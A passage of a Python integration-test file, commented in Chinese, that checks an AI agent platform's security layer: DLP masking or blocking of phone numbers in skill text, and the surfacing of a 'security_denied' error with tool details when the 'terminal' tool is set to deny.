                "sk.block": "block",
            }
            self.calls = 0

        def dlp_scan(self, agent_id, text):
            self.calls += 1
            match = re.search(r"1[3-9]\d{9}", text)
            if not match:
                return {"ok": True, "findings": []}
            return {
                "ok": True,
                "findings": [{
                    "pii_type": "phone",
                    "start": match.start(),
                    "end": match.end(),
                    "action": self.actions.get(agent_id, "audit_only"),
                }],
            }

        def dlp_policy(self, agent_id):
            return {"phone": self.actions.get(agent_id, "audit_only")}

    fake_client = _FakeSecurityClient()
    previous_runtime = sys.modules.get("bianbu_agent.security.security_runtime")
    previous_client = sys.modules.get("bianbu_security_client")
    sys.modules["bianbu_agent.security.security_runtime"] = types.SimpleNamespace(
        security_client_module=lambda: fake_client
    )
    sys.modules["bianbu_security_client"] = fake_client
    spec.loader.exec_module(m)

    TEXT = "遇到问题联系运维 13812345678"
    steps = []

    # 干净文本原样通过（不能因为过了 DLP 就改坏 Skill）
    clean = "帮用户整理会议纪要，按时间排序。"
    steps.append(Step("干净文本原样通过",
                      m.scan_skill_text("sk.a", "s", clean) == clean))

    # audit_only：放行但记日志（默认 phone=L2 → audit_only）
    m.clear_cache()
    out = m.scan_skill_text("sk.audit", "s", TEXT)
    steps.append(Step("audit_only 策略下放行不改文本", out == TEXT,
                      f"实际 {out!r}"))

    # mask：脱敏后继续
    m.clear_cache()
    out = m.scan_skill_text("sk.mask", "s", TEXT)
    c.log(f"mask 策略：{TEXT!r} → {out!r}")
    steps.append(Step("mask 策略下手机号被脱敏",
                      "13812345678" not in out and "[PII-phone-001]" in out,
                      f"实际 {out!r}"))
    steps.append(Step("脱敏只替换 PII，其余文本保留",
                      "遇到问题联系运维" in out, f"实际 {out!r}"))

    # block：该 Skill 拒绝载入
    m.clear_cache()
    rejected = False
    try:
        m.scan_skill_text("sk.block", "leaky.skill", TEXT)
    except m.SkillTextRejected as e:
        rejected = True
        c.log(f"block 策略：{e}")
    steps.append(Step("block 策略下拒绝载入", rejected,
                      "未拒绝 —— 运维标为绝不外发的类型进了 prompt"))

    # 批量：一个被拒不影响其余（否则一个坏 Skill 让整个 Agent 起不来）
    m.clear_cache()
    got = m.scan_skill_sections("sk.block", {"ok": clean, "leaky": TEXT})
    steps.append(Step("一个 Skill 被拒不影响其余",
                      sorted(got) == ["ok"], f"实际保留 {sorted(got)}"))

    # 缓存：Skill 文本安装后不变，不该每轮 run 都重扫
    m.clear_cache()
    m.scan_skill_text("sk.mask", "s", TEXT)
    import time
    t0 = time.perf_counter()
    m.scan_skill_text("sk.mask", "s", TEXT)
    dt = (time.perf_counter() - t0) * 1000
    c.log(f"缓存命中耗时 {dt:.4f}ms")
    steps.append(Step("重复扫描走缓存（<1ms）", dt < 1.0, f"实际 {dt:.4f}ms"))

    # block 结果不缓存 —— 策略改宽后应立即生效
    fake_client.actions["sk.block"] = "mask"
    out = m.scan_skill_text("sk.block", "leaky.skill", TEXT)
    steps.append(Step("策略改宽后立即生效（拒绝结果未被缓存）",
                      "[PII-phone-001]" in out, f"实际 {out!r}"))
    steps.append(Step("通过版本化 client 调用 dlp.scan",
                      fake_client.calls > 0,
                      f"调用次数 {fake_client.calls}"))
    if previous_runtime is None:
        sys.modules.pop("bianbu_agent.security.security_runtime", None)
    else:
        sys.modules["bianbu_agent.security.security_runtime"] = previous_runtime
    if previous_client is None:
        sys.modules.pop("bianbu_security_client", None)
    else:
        sys.modules["bianbu_security_client"] = previous_client
    return steps


@test("ERR-01", "安全拦截的原因透传到前端（不再是「发送失败，请稍后再试」）",
      "INT-PA-06", "hook")
def t_error_surface(c: Ctx):
    """用户报的原始症状：工具被拦时前端只显示「发送失败，请稍后再试」。

    根因是两段信息丢失：
      ① run_manager 把 SecurityDenied 一律包成 code="run_failed"，
         前端无从判断这是权限问题还是崩溃
      ② _project_events 的兜底分支只取 code/message，丢掉 details

    结果用户看到"系统故障，重试可能会好"，实际是"这个操作没有授权，
    重试一万次也一样"，且不知道缺哪个工具、该去哪里授权。

    本项在**真实 PA + 真实 securityd** 上验证：把 terminal 策略置为 deny →
    发一条会用 terminal 的消息 → 检查 run 详情里的 error 结构。
    """
    import dbus as _dbus

    # 用 terminal（工具名即策略键）。此前是 system.execute（L4 能力），
    # 删掉能力名后统一按工具名判权，deny 的工具必被拦下。
    TOOL = "terminal"
    before = {str(x.get("tool")): x for x in (c.dbus().GetCapabilities(AGENT_ID) or [])}
    had = TOOL in before
    previous = str(before.get(TOOL, {}).get("policy", "")) if had else ""
    c.log(f"撤销前：has={had} policy={previous}")

    try:
        c.dbus().SetCapabilityPolicy(AGENT_ID, TOOL, "deny")
        current = {str(x.get("tool")): x for x in
                   (c.dbus().GetCapabilities(AGENT_ID) or [])}.get(TOOL, {})
        revoked = str(current.get("policy")) == "deny"
        c.log(f"置 deny 后 policy={current.get('policy')}")
        steps = [Step("置为 deny 生效", revoked, f"实际 {current.get('policy')}")]

        seq0 = c.audit_seq()
        with c.enforcing_mode(AGENT_ID):
            d = c.run_prompt("请只调用一次 terminal 工具执行命令 `echo BNSEC-ERR01`，"
                             "并把输出原样回复。不要调用其他工具。", timeout=120,
                             approve_tools=(TOOL,))
        delta = c.audit_since(seq0)
        checks = [r for r in delta if r.get("agent_id") == AGENT_ID
                  and r.get("op_type") == "check_permission"
                  and str(r.get("target", "")).startswith(f"{TOOL}:")]
        executed = [r for r in delta if r.get("agent_id") == AGENT_ID
                    and r.get("op_type") == TOOL]
        c.log(f"check_permission({TOOL})={[(r['target'], r['result']) for r in checks[:3]]} "
              f"tool_executed={len(executed)}")
        steps.append(Step("模型确实发起了工具调用（securityd 有该工具的判权审计）", bool(checks),
                          "无 check_permission —— 模型未调用工具，本项无从验证（非产品缺陷）"))
        steps.append(Step("securityd 判权为 deny", any(r.get("result") == "deny" for r in checks),
                          f"实际 {[r.get('result') for r in checks]}"))
        steps.append(Step("被拒工具零执行（无 terminal 执行审计）", not executed,
                          f"仍有 {len(executed)} 条 {TOOL} 执行审计 —— DENY 未阻止下游"))
        err = d.get("error") or {}
        c.log(f"run 状态={d.get('status')} error.code={err.get('code')}")
        c.log(f"error.message={str(err.get('message'))[:200]}")
        c.log(f"error.details={err.get('details')}")

        steps.append(Step("run 因安全拦截失败", d.get("status") == "failed",
                          f"实际 {d.get('status')} —— 未被拦下则本项无从验证"))
        # 核心断言：code 必须可识别，前端才能分流
        steps.append(Step("错误码为 security_denied（非泛化 run_failed）",
                          err.get("code") == "security_denied",
                          f"实际 {err.get('code')} —— 前端只能显示通用重试文案"))
        msg = str(err.get("message") or "")
        steps.append(Step("消息含工具名（用户能看懂缺什么）", TOOL in msg,
                          f"实际消息：{msg[:200]}"))
        steps.append(Step("消息带 [bianbu-security] 来源标识",
                          "bianbu-security" in msg, f"实际：{msg[:120]}"))

        details = err.get("details") or {}
        steps.append(Step("details 指出被拦的工具",
                          str(details.get("tool")) == TOOL,
                          f"实际 tool={details.get('tool')} —— 运维无法定位"))
        steps.append(Step("details 指出所需工具策略",
                          str(details.get("tool") or details.get("capability")) == TOOL,
                          f"实际 {details.get('tool') or details.get('capability')}"))
        steps.append(Step("details 区分「明确拒绝」与「securityd 不可达」",
                          details.get("degraded") is False,
                          f"实际 degraded={details.get('degraded')} —— "
                          f"二者提示文案不同（一个要授权，一个要修总线）"))
        return steps
    finally:
        try:
            if had and previous:
                c.dbus().SetCapabilityPolicy(AGENT_ID, TOOL, previous)
            else:
                c.dbus().RevokePermission(AGENT_ID, TOOL)
            restored = {x["tool"]: x for x in
                        (c.dbus().GetCapabilities(AGENT_ID) or [])}.get(TOOL, {})
            c.log(f"已恢复：policy={restored.get('policy')}")
        except Exception as e:  # noqa: BLE001
            c.log(f"恢复失败（需人工检查）：{str(e)[:160]}")
